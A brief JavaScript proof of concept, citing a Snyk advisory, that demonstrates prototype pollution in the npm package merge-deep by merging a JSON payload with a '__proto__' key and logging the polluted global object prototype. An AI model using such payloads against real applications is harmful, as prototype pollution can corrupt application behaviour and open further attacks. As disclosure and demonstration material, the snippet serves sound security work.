// https://snyk.io/vuln/npm:merge-deep:20180215
  const merge = require("merge-deep");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  console.log({}.polluted)
  merge({}, JSON.parse(malicious_payload));
  console.log({}.polluted)
